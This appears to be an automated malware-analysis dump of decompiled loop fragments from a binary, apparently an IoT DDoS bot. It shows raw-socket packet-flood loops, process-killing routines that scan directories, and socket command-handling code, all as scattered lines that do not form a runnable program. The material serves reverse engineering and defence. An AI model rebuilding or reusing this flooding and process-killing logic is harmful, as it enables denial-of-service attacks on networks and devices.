		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(24 * option_value + a2), 16);
		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(24 * option_value + a2), 16);
=============================WHILE LOOPS ID : 17 @ function_ccfc ====================================
++++++++ WHILE START : 28713 
++++++++ WHILE FUNCTION : function_ccfc 
++++++++ WHILE END : 28900 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
		while (true) {
=============================WHILE LOOPS ID : 19 @ function_d470 ====================================
++++++++ WHILE START : 29339 
++++++++ WHILE FUNCTION : function_d470 
++++++++ WHILE END : 29523 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		sendto(fd, (int32_t *)message, 60, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
		sendto(fd, (int32_t *)message, 60, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
=============================WHILE LOOPS ID : 21 @ function_dbb4 ====================================
++++++++ WHILE START : 29905 
++++++++ WHILE FUNCTION : function_dbb4 
++++++++ WHILE END : 29945 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t sock_fd = socket(AF_INET, 17, IPPROTO_UDP); // 0xdd04
		if (sock_fd == -1) {
		return sock_fd;
		bind(sock_fd, (struct sockaddr *)&addr, 16);
		int32_t sock; // 0xdda8
		connect(sock, (struct sockaddr *)addr2, 16);
=============================WHILE LOOPS ID : 22 @ function_dbb4 ====================================
++++++++ WHILE START : 29948 
++++++++ WHILE FUNCTION : function_dbb4 
++++++++ WHILE END : 30011 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		int32_t sock2; // 0xde20
		send(sock2, (int32_t *)buf, length, MSG_NOSIGNAL);
		send(sock2, (int32_t *)buf, length, MSG_NOSIGNAL);
		int32_t sock3; // 0xde74
		send(sock3, (int32_t *)buf2, length, MSG_NOSIGNAL);
		send(sock3, (int32_t *)buf2, length, MSG_NOSIGNAL);
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 26 @ function_de9c ====================================
++++++++ WHILE START : 30459 
++++++++ WHILE FUNCTION : function_de9c 
++++++++ WHILE END : 30604 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(a2 + 24 * option_value), 16);
		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(a2 + 24 * option_value), 16);
=============================WHILE LOOPS ID : 30 @ function_e528 ====================================
++++++++ WHILE START : 31060 
++++++++ WHILE FUNCTION : function_e528 
++++++++ WHILE END : 31166 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		sendto(fd, (int32_t *)message, v350 + 32, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
=============================WHILE LOOPS ID : 32 @ function_e9ec ====================================
++++++++ WHILE START : 31585 
++++++++ WHILE FUNCTION : function_e9ec 
++++++++ WHILE END : 31959 
++++++++ INTRESTING INSTRUCTIONS :  
		result = inet_addr((char *)&cp);
		sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
		if (sock_fd == -1) {
		return sock_fd;
		if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
		result2 = close(sock_fd);
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		sendto(sock_fd, (int32_t *)fd, v359 + 47, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
		result = inet_addr((char *)&cp);
		sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
		if (sock_fd == -1) {
		return sock_fd;
		if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
		result2 = close(sock_fd);
		while (true) {
=============================WHILE LOOPS ID : 40 @ function_f2bc ====================================
++++++++ WHILE START : 33860 
++++++++ WHILE FUNCTION : function_f2bc 
++++++++ WHILE END : 34374 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		close(fd2);
		dirp = opendir((char *)name);
		while (true) {
		while (true) {
		struct __dirstream * dirp2 = opendir((char *)&path); // 0xf660
		while (true) {
		while (true) {
		kill(function_13380((char *)v390, 10), SIGKILL);
		struct dirent * v407 = readdir((struct __dirstream *)dirp3); // 0xf75c
		struct dirent * v408 = readdir((struct __dirstream *)dirp3); // 0xf670
		closedir((struct __dirstream *)dirp3);
		v399 = readdir((struct __dirstream *)fd2);
		closedir((struct __dirstream *)dirp4);
		closedir((struct __dirstream *)dirp3);
		v399 = readdir((struct __dirstream *)fd2);
		struct dirent * v418 = readdir((struct __dirstream *)fd2); // 0xf57c
		closedir((struct __dirstream *)fd2);
		closedir((struct __dirstream *)fd2);
		close(fd2);
		dirp = opendir((char *)name);
		while (true) {
		closedir((struct __dirstream *)fd2);
=============================WHILE LOOPS ID : 42 @ function_f828 ====================================
++++++++ WHILE START : 34833 
++++++++ WHILE FUNCTION : function_f828 
++++++++ WHILE END : 35403 
++++++++ INTRESTING INSTRUCTIONS :  
		struct __dirstream * v357 = opendir((char *)function_1289c(6, NULL)); // 0xfa58
		struct dirent * v358 = readdir((struct __dirstream *)dirp); // 0xfa70119
		while (true) {
		while (true) {
		int32_t fd2 = open((char *)&path2, O_RDONLY); // 0xfcc4
		close(fd2);
		while (true) {
		while (true) {
		close(fd2);
		kill(time_val, SIGKILL);
		v365 = readdir((struct __dirstream *)dirp);
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		close(fd2);
		kill(time_val, SIGKILL);
		int32_t pid2 = getpid(); // 0xfc5c
		int32_t ppid = getppid(); // 0xfc68
		int32_t fd3 = open((char *)buf2, O_RDONLY); // 0xfca0
		kill(time_val, SIGKILL);
		close(fd4);
		v365 = readdir((struct __dirstream *)dirp);
		v365 = readdir((struct __dirstream *)dirp);
		struct dirent * v426 = readdir((struct __dirstream *)dirp); // 0xfaf0
		v365 = readdir((struct __dirstream *)dirp2);
		v365 = readdir((struct __dirstream *)dirp2);
		v365 = readdir((struct __dirstream *)dirp);
		closedir((struct __dirstream *)dirp);
		closedir((struct __dirstream *)dirp);
=============================WHILE LOOPS ID : 43 @ function_1019c ====================================
++++++++ WHILE START : 36987 
++++++++ WHILE FUNCTION : function_1019c 
++++++++ WHILE END : 37304 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		int32_t sock2;
		while (true) {
		v371 = sock2;
		int32_t sock;
		if (sock == -1) {
		int32_t sock_fd = socket(AF_INET, SOCK_STREAM, protocol); // 0x1094c
		int32_t fd5 = sock_fd; // r5
		if (sock_fd != -1) {
		fcntl(sock_fd, F_GETFL);
		connect(sock, (struct sockaddr *)&addr, 16);
		uint32_t v377 = sock; // 0x10800
		int32_t v381 = sock; // 0x106ec
		int32_t v382 = sock2; // 0x10708
		if (sock2 < v381) {
		send(sock, (int32_t *)&buf2, 2, MSG_NOSIGNAL);
		if (sock2 != -1) {
		if ((v389 >> sock2 % 32) % 2 != 0) {
		int32_t accepted_sock_fd = accept(sock2, (struct sockaddr *)&addr2, &addr_len); // 0x10a48
		int32_t v390 = function_10e5c(accepted_sock_fd); // 0x10a4c
		kill(-v353, SIGKILL);
		uint32_t sock3 = sock; // 0x10830
		if (sock3 != -1) {
		if ((v394 >> sock3 % 32) % 2 != 0) {
		int32_t v395 = recv(sock, (int32_t *)&buf2, 2, MSG_PEEK | MSG_NOSIGNAL); // 0x1088c
		__pseudo_cond_branch(sock != -1, (int32_t)&v393);
		sock = -1;
		recv(sock, (int32_t *)&buf2, 2, MSG_NOSIGNAL);
		close(sock);
		int32_t v407 = recv(sock, &buf3, (int32_t)v405 | 256 * v406, MSG_PEEK | MSG_NOSIGNAL); // 0x10908
		recv(sock, (int32_t *)&buf2, 2, MSG_NOSIGNAL);
		recv(sock, &buf3, 256 * (int32_t)v408 | v406, MSG_NOSIGNAL);
		if ((v412 >> sock3 % 32) % 2 == 0) {
		__pseudo_cond_branch(sock3 != -1, (int32_t)&v393);
		getsockopt(sock3, SO_DEBUG, 4, &addr_len, &option_len);
		int32_t sock4; // 0x10a90
		send(sock4, &buf4, 4, MSG_NOSIGNAL);
		int32_t sock5; // 0x10aa0
		send(sock5, (int32_t *)&buf2, 1, MSG_NOSIGNAL);
		int32_t sock6; // 0x10abc
		send(sock6, &buf5, length, MSG_NOSIGNAL);
		close(sock);
		v371 = sock2;
=============================WHILE LOOPS ID : 49 @ function_110e8 ====================================
++++++++ WHILE START : 40478 
++++++++ WHILE FUNCTION : function_110e8 
++++++++ WHILE END : 42307 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0x111bc
		sock = sock_fd;
		if (sock_fd == -1) {
		fcntl(sock_fd, F_GETFL);
		fcntl(sock_fd, F_SETFL);
		if (setsockopt(sock, status, 3, &status, 4) != 0) {
		close(sock);
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		uint32_t v359 = recvfrom(sock, &buf, 1514, MSG_NOSIGNAL, (struct sockaddr *)addr, (int32_t *)addr); // 0x118a4
		while (true) {
		while (true) {
		while (true) {
		close(fd);
		while (true) {
		uint32_t sock18; // 0x11c34
		if (sock18 != -1) {
		if ((v398 >> sock18 % 32) % 2 == 0) {
		v397 = sock18;
		while (true) {
		while (true) {
		int32_t sock2; // 0x11d78
		int32_t v408 = recv(sock2, (int32_t *)buf2, 256 - v407, MSG_NOSIGNAL); // 0x11d88
		close(fd2);
		while (true) {
		case 2: {
		while (true) {
		while (true) {
		int32_t sock3; // 0x12704
		send(sock3, &buf3, 3, MSG_NOSIGNAL);
		send(0x4000, (int32_t *)buf4, 3, MSG_NOSIGNAL);
		send(0x4000, (int32_t *)(int32_t)&buf5, 9, MSG_NOSIGNAL);
		while (true) {
		case 2: {
		while (true) {
		case 3: {
		while (true) {
		int32_t sock4; // 0x11f48
		send(sock4, (int32_t *)buf6, (int32_t)length, MSG_NOSIGNAL);
		int32_t sock5; // 0x11f60
		send(sock5, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		case 4: {
		while (true) {
		int32_t sock6; // 0x12228
		send(sock6, (int32_t *)buf7, (int32_t)length2, MSG_NOSIGNAL);
		int32_t sock7; // 0x12240
		send(sock7, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		case 5: {
		while (true) {
		int32_t sock8; // 0x12000
		send(sock8, (int32_t *)buf8, length3, MSG_NOSIGNAL);
		int32_t sock9; // 0x12014
		send(sock9, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		while (true) {
		while (true) {
		case 6: {
		while (true) {
		int32_t sock10; // 0x120b4
		send(sock10, (int32_t *)buf9, length4, MSG_NOSIGNAL);
		int32_t sock11; // 0x120c8
		send(sock11, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		case 7: {
		while (true) {
		int32_t sock12; // 0x122e0
		send(sock12, (int32_t *)buf10, length4, MSG_NOSIGNAL);
		int32_t sock13; // 0x122f4
		send(sock13, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		case 8: {
		while (true) {
		int32_t sock14; // 0x12394
		send(sock14, (int32_t *)buf11, length3, MSG_NOSIGNAL);
		int32_t sock15; // 0x123a8
		send(sock15, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		case 9: {
		while (true) {
		int32_t sock16; // 0x12448
		send(sock16, (int32_t *)buf12, length3, MSG_NOSIGNAL);
		int32_t sock17; // 0x1245c
		send(sock17, (int32_t *)"\r\n", 2, MSG_NOSIGNAL);
		case 10: {
		int32_t v529 = fork(); // 0x1260c
		int32_t sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x12768
		t = sock_fd2;
		if (sock_fd2 == -1) {
		if (connect(t, (struct sockaddr *)&addr2, 16) == -1) {
		close(t);
		send(t, &length3, 1, MSG_NOSIGNAL);
		send(t, &length4, 4, MSG_NOSIGNAL);
		send(t, &buf13, 2, MSG_NOSIGNAL);
		send(t, (int32_t *)(v531 + 12), 1, MSG_NOSIGNAL);
		send(t, (int32_t *)buf14, (int32_t)length5, MSG_NOSIGNAL);
		send(t, (int32_t *)(v531 + 13), 1, MSG_NOSIGNAL);
		send(t, (int32_t *)buf15, (int32_t)length6, MSG_NOSIGNAL);
		close(t);
		close(fd3);
		close(fd4);
		while (true) {
		case 3: {
		case 4: {
		case 5: {
		case 6: {
		case 7: {
		case 8: {
		case 9: {
		case 10: {
		while (true) {
		if ((length4 | getsockopt(sock18, SO_DEBUG, 4, &length4, &length3)) == 0) {
		close(fd5);
		while (true) {
=============================WHILE LOOPS ID : 76 @ __udivsi3 ====================================
++++++++ WHILE START : 49931 
++++++++ WHILE FUNCTION : __udivsi3 
++++++++ WHILE END : 50143 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 77 @ __umodsi3 ====================================
++++++++ WHILE START : 50880 
++++++++ WHILE FUNCTION : __umodsi3 
++++++++ WHILE END : 51234 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 78 @ __modsi3 ====================================
++++++++ WHILE START : 51661 
++++++++ WHILE FUNCTION : __modsi3 
++++++++ WHILE END : 52041 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
